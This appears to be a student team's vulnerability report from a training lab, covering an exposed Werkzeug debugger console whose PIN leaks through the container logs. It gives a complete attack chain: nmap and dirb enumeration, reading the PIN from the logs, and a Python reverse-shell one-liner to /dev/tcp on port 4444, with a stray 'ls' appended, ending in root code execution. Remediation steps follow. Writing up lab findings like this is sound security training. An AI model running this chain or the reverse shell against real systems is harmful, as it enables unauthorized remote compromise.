**CVE-ID**: EDU-GALACTICARCHIVES-2026-T03-010  
**Title**: Werkzeug Debugger PIN Exposure Leading to Remote Code Execution and Root Compromise  
**Affected Lab**: galactic-archives    
**Component**: /console endpoint  
**Severity**: Critical    
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H   
**CVSS Score**: 10.0  


**Description**:  
The Werkzeug interactive debugger console was accessible at the `/console` endpoint with debug mode enabled in production. The debugger PIN code was exposed in application logs, allowing unauthorized attackers to bypass authentication, gain arbitrary Python code execution, and escalate to root access on the underlying system.


**Proof of Concept**:  

Payload:
 ```python
 #for RCE
import os;os.system("bash -c 'bash -i >& /dev/tcp/[yourIP]/4444 0>&1'")ls
```

**Steps to Reproduce**:  
1. Determine galactic-archives IP by using commands `sudo docker ps` followed by `sudo docker inspect [CONTAINERID]`. Or any other method of choice.
2. Perform nmap scan on the found IP by also enabling the default scripts: `nmap -sV -sC -T5 -p- [galactic-archivesIP]`. Output will show a http service at port 5000.
3. perform directory enumeration with dirb `dirb http://[galactic-archivesIP]:5000/ /usr/share/wordlists/dirb/common.txt` you will dicsover a /console endpoint which is locked.
4. Run `sudo docker logs [containerID]` to view the password from the logs.
5. After inputting the password on the /console. Put the payload and set up a netcat listener at port 4444.
6. Observe RCE with root access

**Remediation**:
1. Disable debug mode in production
2. Never expose debugger endpoints in production environments
3. Remove debugger PIN from logs - implement log sanitization
4. Use container security best practices - run as non-root user

**Discovered By**: Team 3  
**Date**: 2026-02-24
